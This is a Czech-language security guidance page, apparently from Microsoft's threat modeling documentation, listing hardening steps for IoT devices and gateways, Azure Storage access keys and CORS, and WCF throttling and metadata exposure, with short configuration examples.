## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Zajistěte, aby na zařízeních nebyl spuštěn neznámý kód.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Povolení zabezpečeného spouštění a šifrování zařízení bitových zámků ve Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Kroky** | Zabezpečené spouštění UEFI omezuje systém tak, aby povoloval jenom spouštění binárních souborů podepsaných konkrétní autoritou. Tato funkce brání spuštění neznámého kódu na platformě a potenciálně oslabení stav zabezpečení. Povolte zabezpečené spouštění UEFI a omezte seznam certifikačních autorit, které jsou důvěryhodné pro podpisový kód. Podepište veškerý kód, který je nasazený na zařízení pomocí jedné z důvěryhodných autorit. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Zašifrujte operační systém a další oddíly zařízení IoT pomocí bitových zámků.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Windows 10 IoT Core implementuje zjednodušenou verzi šifrování zařízení s bitovým zámkem, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v rozhraní UEFI, který provádí nezbytná měření. Tato měření preOS zajišťují, že operační systém později má konečný záznam o tom, jak byl operační systém spuštěn. Zašifrujte oddíly operačního systému pomocí bitových zámků a dalších oddílů pro případ, že ukládají citlivá data. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Zajistěte, aby na zařízeních byly povolené jenom minimální služby a funkce.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Nepovolujte ani nepínejte žádné funkce nebo služby v operačním systému, které nejsou pro fungování řešení vyžadovány. Například pokud zařízení nevyžaduje nasazení uživatelského rozhraní, nainstalujte systém Windows IoT Core v režimu bezobslužné instalace. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Zašifrujte operační systém a další oddíly brány pole IoT pomocí bitových zámků.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána pole IoT | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Windows 10 IoT Core implementuje zjednodušenou verzi šifrování zařízení s bitovým zámkem, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v rozhraní UEFI, který provádí nezbytná měření. Tato měření preOS zajišťují, že operační systém později má konečný záznam o tom, jak byl operační systém spuštěn. Zašifrujte oddíly operačního systému pomocí bitových zámků a dalších oddílů pro případ, že ukládají citlivá data. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána pole IoT | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny. |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Zajistěte, aby cloudová brána implementovala proces, který zachová firmware připojených zařízení v aktuálním stavu.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Cloudová brána IoT | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | Volba brány – Azure IoT Hub |
| **Reference**              | [Přehled správy zařízení IoT Hub](../../iot-hub/iot-hub-device-management-overview.md), [jak aktualizovat firmware zařízení](../../iot-hub/tutorial-firmware-update.md) |
| **Kroky** | LWM2M je protokol od Open Mobile Alliance pro správu zařízení IoT. Správa zařízení ve službě Azure IoT umožňuje pracovat s fyzickými zařízeními pomocí úloh zařízení. Zajistěte, aby cloudová brána implementovala proces pro rutinu, která pravidelně udržuje zařízení a další konfigurační data v aktuálním stavu pomocí správy zařízení Azure IoT Hub. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad pro organizace.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Hranice důvěryhodnosti počítače | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | –  |
| **Kroky** | Zajistěte, aby zařízení měla ovládací prvky zabezpečení koncového bodu, jako je například rozšíření bitového zámku pro šifrování na úrovni disku, antivirový program s aktualizovanými podpisy, brány firewall na bázi hostitele, upgrady operačního systému, zásady skupiny atd., se konfigurují podle zásad zabezpečení organizace. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Zajistěte zabezpečenou správu přístupových klíčů Azure Storage.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **Fáze SDL**               | Nasazení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Azure Storage Průvodce zabezpečením – Správa klíčů účtu úložiště](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Kroky** | <p>Úložiště klíčů: doporučuje se ukládat přístupové klíče Azure Storage do Azure Key Vault jako tajný kód a nechat aplikace získat klíč z trezoru klíčů. Tento postup je doporučený z následujících důvodů:</p><ul><li>Aplikace nikdy nebude mít klíč úložiště pevně zakódované v konfiguračním souboru. tím se odstraní tento způsob někoho, kdo získá přístup k klíčům bez konkrétního oprávnění.</li><li>Přístup ke klíčům lze ovládat pomocí Azure Active Directory. To znamená, že vlastník účtu může udělit přístup k několik aplikacím, které potřebují načíst klíče z Azure Key Vault. Ostatní aplikace nebudou mít přístup ke klíčům bez udělení oprávnění výslovně.</li><li>Opětovné vytvoření klíče: doporučuje se, abyste měli k dispozici proces pro opětovné vygenerování přístupových klíčů úložiště Azure z bezpečnostních důvodů. Podrobnosti o tom, proč a jak naplánovat vygenerování klíčů, najdete v článku Referenční příručka zabezpečení Azure Storage</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v Azure Storage povolené CORS.

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | Obecné |
| **Atributy**              | –  |
| **Reference**              | [Podpora CORS pro služby Azure Storage](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Kroky** | Azure Storage umožňuje povolit CORS – mezi zdroji sdílení prostředků. Pro každý účet úložiště můžete zadat domény, které budou mít přístup k prostředkům v daném účtu úložiště. Ve výchozím nastavení je CORS ve všech službách zakázaná. CORS můžete povolit pomocí REST API nebo klientské knihovny úložiště pro volání jedné z metod pro nastavení zásad služby. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Povolit funkci omezování služby WCF

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | .NET Framework 3 |
| **Atributy**              | –  |
| **Reference**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [obohacení království](https://vulncat.fortify.com) |
| **Kroky** | <p>Omezení použití systémových prostředků by mohlo vést k vyčerpání prostředků a nakonec k odepření služby.</p><ul><li>**Vysvětlení:** Windows Communication Foundation (WCF) nabízí možnost omezit žádosti o služby. Povolení příliš velkého počtu žádostí klienta může naplavit systém a vyčerpat jeho prostředky. Na druhé straně může být povolení jenom malého počtu požadavků ke službě zabránit legitimním uživatelům v používání služby. Každá služba by měla být individuálně vyladěna a nakonfigurována tak, aby umožňovala odpovídající množství prostředků.</li><li>**Doporučení** Povolte funkci omezování služby WCF a nastavte limity vhodné pro vaši aplikaci.</li></ul>|

### <a name="example"></a>Příklad
Následuje příklad konfigurace s povoleným omezením:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF – zpřístupnění informací prostřednictvím metadat

| Nadpis                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **Fáze SDL**               | Sestavení |  
| **Použitelné technologie** | .NET Framework 3 |
| **Atributy**              | –  |
| **Reference**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [obohacení království](https://vulncat.fortify.com) |
| **Kroky** | Metadata můžou útočníkům pomáhat se systémem a naplánovat formu útoku. Služby WCF je možné nakonfigurovat tak, aby vystavily metadata. Metadata poskytují podrobné informace o popisu služby a neměly by se vysílat v produkčních prostředích. `HttpGetEnabled`  /  `HttpsGetEnabled` Vlastnosti třídy oddílu serviceMetadata definují, zda bude služba vystavovat metadata. | 

### <a name="example"></a>Příklad
Následující kód dá WCF, aby vysílaly metadata služby.
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Nevytvářejte metadata služby v produkčním prostředí. Nastavte vlastnosti HttpGetEnabled/HttpsGetEnabled třídy oddílu serviceMetadata na hodnotu false. 

### <a name="example"></a>Příklad
Následující kód vydá pokyn WCF, aby nevysílal metadata služby. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```